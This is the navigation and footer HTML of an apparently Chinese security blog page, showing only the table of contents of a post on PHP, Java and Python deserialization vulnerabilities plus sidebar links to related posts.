          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#unserialize"><span class="toc-number">1.</span> <span class="toc-text"> Unserialize</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1php"><span class="toc-number">1.1.</span> <span class="toc-text"> 1.php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E4%B8%8E%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 类与对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 魔法方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 序列化与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.3.1.</span> <span class="toc-text"> 序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.3.2.</span> <span class="toc-text"> 反序列化</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.</span> <span class="toc-text"> 利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x00-__destruct%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.1.</span> <span class="toc-text"> 0x00 __destruct () 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-__tostring%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.2.</span> <span class="toc-text"> 0x01 __tostring () 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-__wakeup%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.3.</span> <span class="toc-text"> 0x02 __wakeup () 利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-__wakeup%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.4.4.</span> <span class="toc-text"> 0x03 __wakeup () 绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04%E5%AF%B9%E8%B1%A1%E9%80%83%E9%80%B8"><span class="toc-number">1.1.4.5.</span> <span class="toc-text"> 0x04 对象逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%A4%9A"><span class="toc-number">1.1.4.5.1.</span> <span class="toc-text"> 过滤后字符变多</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%B0%91"><span class="toc-number">1.1.4.5.2.</span> <span class="toc-text"> 过滤后字符变少</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x05pop-%E9%93%BE%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.4.6.</span> <span class="toc-text"> 0x05POP 链利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x06"><span class="toc-number">1.1.4.7.</span> <span class="toc-text"> 0x06</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x07"><span class="toc-number">1.1.4.8.</span> <span class="toc-text"> 0x07</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x08"><span class="toc-number">1.1.4.9.</span> <span class="toc-text"> 0x08</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x09"><span class="toc-number">1.1.4.10.</span> <span class="toc-text"> 0x09</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php_session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.4.11.</span> <span class="toc-text"> PHP_session 反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%A7%A6%E5%8F%91php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.4.12.</span> <span class="toc-text"> phar 伪协议触发 php 反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x10"><span class="toc-number">1.1.4.13.</span> <span class="toc-text"> 0x10</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#joomla-346%E5%AF%B9%E8%B1%A1%E9%80%83%E9%80%B8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.5.</span> <span class="toc-text"> Joomla  3.4.6 对象逃逸反序列化执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#joomla-342%E6%88%AA%E6%96%AD%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.6.</span> <span class="toc-text"> Joomla 3.4.2 截断反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#thinkphp-5022-rce"><span class="toc-number">1.1.7.</span> <span class="toc-text"> Thinkphp 5.0.22 RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#typecho-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.8.</span> <span class="toc-text"> typecho 反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2java"><span class="toc-number">1.2.</span> <span class="toc-text"> 2.java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 反射</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rmi"><span class="toc-number">1.2.2.</span> <span class="toc-text"> RMI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BBrmi-registry"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 攻击 RMI registry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 序列化和反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro-124%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.5.</span> <span class="toc-text"> Shiro 1.2.4 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log4j2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.6.</span> <span class="toc-text"> log4j2 反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.7.</span> <span class="toc-text"> fastjson 反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1214-cnvd-2017-02833"><span class="toc-number">1.2.7.1.</span> <span class="toc-text"> 1.2.14 CNVD-2017-02833</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1247-cnvd-2017-22238"><span class="toc-number">1.2.7.2.</span> <span class="toc-text"> 1.2.47 CNVD-2017-22238</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#apache-common-collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.8.</span> <span class="toc-text"> Apache Common Collections 反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE1"><span class="toc-number">1.2.8.1.</span> <span class="toc-text"> 利用链 1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struts-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.2.9.</span> <span class="toc-text"> struts 2 反序列化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3python"><span class="toc-number">1.3.</span> <span class="toc-text"> 3.python</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle"><span class="toc-number">1.3.1.</span> <span class="toc-text"> pickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#json"><span class="toc-number">1.3.2.</span> <span class="toc-text"> json</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 反序列化流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%86%99opcode"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 手写 opcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#__reduce__r%E6%8C%87%E4%BB%A4"><span class="toc-number">1.3.5.</span> <span class="toc-text"> __reduce__(R 指令)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8C%85%E5%90%AB%E8%A6%86%E7%9B%96c%E6%8C%87%E4%BB%A4%E7%A0%81"><span class="toc-number">1.3.6.</span> <span class="toc-text"> 全局变量包含覆盖： c  指令码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8build%E6%8C%87%E4%BB%A4rce"><span class="toc-number">1.3.7.</span> <span class="toc-text"> 使用 build 指令 rce</span></a></li></ol></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
        <ul>
          <li><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li><a href="/2022/05/17/include/" rel="bookmark" title="file include">file include</a></li><li><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li><li><a href="/2022/06/27/SSRF/" rel="bookmark" title="SSRF">SSRF</a></li><li class="active"><a href="/2022/08/16/Unserialize/" rel="bookmark" title="unserialize">unserialize</a></li><li><a href="/2022/11/17/JWT%20%E5%9F%BA%E7%A1%80/" rel="bookmark" title="JWT">JWT</a></li><li><a href="/2022/11/27/Docker%E9%80%83%E9%80%B8/" rel="bookmark" title="docker逃逸&capabilities">docker逃逸&capabilities</a></li><li><a href="/2022/12/27/SSTI/" rel="bookmark" title="SSTI">SSTI</a></li><li><a href="/2022/12/31/webshell/" rel="bookmark" title="webshell">webshell</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="John Doe"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">John Doe</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">46</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">6</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">6</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/06/27/SSRF/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/07/15/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" title="中间件漏洞">中间件漏洞</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%BD%91%E7%BB%9C/" title="In 网络">网络</a>
</div>

    <span><a href="/2023/01/20/VXLAN/" title="VXLAN">VXLAN</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/02/21/https%E5%8E%9F%E7%90%86/" title="https+TLS">https+TLS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E8%BF%90%E7%BB%B4/" title="In 运维">运维</a>
</div>

    <span><a href="/2024/01/25/%E8%99%9A%E6%8B%9F%E5%8C%96/" title="虚拟化">虚拟化</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2022/11/01/%E6%B1%87%E7%BC%96/" title="汇编">汇编</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2023/01/03/%E6%BB%B4%E6%B0%B4reverse/" title="水滴rev">水滴rev</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/08/16/Unserialize/" title="unserialize">unserialize</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2023/10/01/1234567/" title="windows逆向进阶">windows逆向进阶</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2023/03/27/http/" title="http">http</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2022/11/11/reverse/" title="逆向">逆向</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2024</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/08/16/Unserialize/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
